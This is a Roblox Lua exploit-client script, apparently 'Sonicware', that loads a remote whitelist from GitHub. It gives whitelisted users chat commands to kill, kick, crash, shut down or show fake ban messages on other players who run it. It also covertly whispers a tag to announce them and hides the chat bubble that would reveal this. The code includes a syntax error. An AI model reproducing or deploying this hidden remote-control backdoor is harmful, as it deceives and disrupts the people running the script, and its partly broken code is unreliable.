-- Developing
local dat = game:HttpGet("https://raw.githubusercontent.com/easyontop/whitelist/main/list.json")
local sx = game:GetService("HttpService")
local xs = sx:JSONDecode(dat) -- white list {userid: {tag:str, r:num,g:num,b:num,pos:num}}
--[[
POSITION
1: DEFAULT
2: PRIVATE
3: ADMIN
4: OWNER
--]]
if not xs then return end
local rs = game:GetService("ReplicatedStorage")
local pl = game:GetService("Players")
local plr = pl.LocalPlayer
local sonicwarePrivateCommands = {
  ["kill"] = function(x)
    if plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
      local hum = plr.Character:FindFirstChild("Humanoid")
      hum.Health = 0
    end
  end,
  ["crash"] = function(x)
    if not setfpscap then return end
    setfpscap(math.huge) -- math.huge == 2^1024-1
  end,
  ["kick"] = function(x)
    local rs = x or "GET REKTED EZ"
    plr:Kick(rs)
  end,
  ["ban"] = function(x)
    local rsx = x or "You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]"
    -- Also allow to edit the ban message for other games to make it looks real.
    plr:Kick(rsx)
  end,
  ["shutdown"] = function(y)
    game:Shutdown()
  end,
  ["rickroll"] = function(x)
    -- start
    local function funnyfunc(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "Never gonna give you up"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "Never gonna give you up"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("SpecialMesh") then
			  v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
			end
		end
		for i,v in pairs(game:GetDescendants()) do
			funnyfunc(v)
		end
		game.DescendantAdded:Connect(funnyfunc)
    -- end
  end
}
local client = {
  ["sonicware"] = "foiewj02349em",
  ["foiewj02349em"] = "sonicware"
} -- dm private, admin, owner if exists so they know default users are using sonicware.
-- if not xs[plr.UserId] then return end -- not even private dumb fuck
local replicatedStorageService = game:GetService("ReplicatedStorage")
local playersService = game:GetService("Players")
local asl = {}
local Notif = Instance.new("ScreenGui")
local List = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
Notif.Name = "Notif"
Notif.Parent = game.StarterGui.Notification
List.Name = "List"
List.Parent = Notif
List.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
List.BackgroundTransparency = 1.000
List.Position = UDim2.new(0.695, 0, 0.025, 0)
List.Size = UDim2.new(0.3, 0, 0.95, 0)
UIListLayout.Parent = List
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
UIListLayout.Padding = UDim.new(0.01, 0)

local function findplayers(arg, plre)
  local pos = {
    ["default"] = 1,
    ["private"] = 2,
    ["admin"] = 3,
    ["owner"] = 4,
  }
  local cc = true
  local temp = {}
  table.insert(temp, plr) 
  cc = false 
  return temp
end

replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(
  function(tab, channel)
    local plrx = playersService:FindFirstChild(tab.FromSpeaker)
		if not plrx then return end
    local msg = tab.Message
    local args = tab.Message:split(" ")
    local xlient = client[#args > 0 and args[#args] or tab.Message]
    local lpr = xs[plr.UserId] and xs[plr.UserId]["pos"] or 1
    local opr = xs[plrx.UserId] and xs[plrx.UserId]["pos"] or 1
    if plr ~= plrx then
      if lpr > 1 and tab.MessageType == "Whisper" and tab.Message:find(client.sonicware) and asl[plrx.Name] == nil then
        asl[plrx.Name] == true
        local ONE = Instance.new("TextLabel")
        ONE.Name = "ONE"
        ONE.Parent = List
        ONE.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        ONE.BorderSizePixel = 0
        ONE.Size = UDim2.new(1, 0, 0.0500000007, 0)
        ONE.Font = Enum.Font.Gotham
        ONE.Text = plrx.Name.." is using Sonicware!"
        ONE.TextColor3 = Color3.fromRGB(255, 255, 255)
        ONE.TextScaled = true
        ONE.TextSize = 15.000
        ONE.TextWrapped = true
        wait(15)
        ONE:Destroy()
      end
      if opr > 1 and #args > 1 then
        table.remove(args, 1)
        local chosenplayers = findplayers(args[1], plrx)
				if table.find(chosenplayers, plr) then
					table.remove(args, 1)
					for i,v in pairs(sonicwarePrivateCommands) do
						if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
              if lpr == 4 then return end -- no effect for owners
							v(args)
							break
						end
					end
				end
      end
    else
      if lpr > 1 then
        local tab = {}
		    for i,v in pairs(sonicwarePrivateCommands) do
		  		table.insert(tab, i)
		  	end
	 	 	  table.sort(tab)
			  local str = ""
			  for i,v in pairs(tab) do
			  	str = str..";"..v.."\n"
		  	end
			  game.StarterGui:SetCore("ChatMakeSystemMessage",{
				  Text = 	str,
			  })
      end
    end
  end
)

local function npc(x)
  if not xs[x.UserId] then
    return
  end
  replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..x.Name.." "..client.sonicware, "All")
  local cnl
  for i,nc in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do 
    if nc:IsA("TextLabel") and nc.Text:find(client.sonicware) then
      nc.Parent.Parent.Visible = false
      repeat task.wait() until nc:IsDescendantOf(nil)
      if cnl then cnl:Disconnect() end
    end
  end
  cnl = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(
    function(nc) 
      if nc:IsA("TextLabel") and nc.Text:find(client.sonicware) then
        nc.Parent.Parent.Visible = false
        repeat task.wait() until nc:IsDescendantOf(nil)
        if cnl then cnl:Disconnect() end
      end
    end
  )
  replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Wait()
  if getconnections then
			for i,v in pairs(getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
				if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
				debug.getupvalues(v.Function)[1]:SwitchCurrentChannel("all")
			end
		end
	end
end
for i, v in pairs(game:GetService("Players"):GetPlayers()) do task.spawn(npc, v) end
game:GetService("Players").PlayerAdded:Connect(function(v) task.spawn(npc, v) end)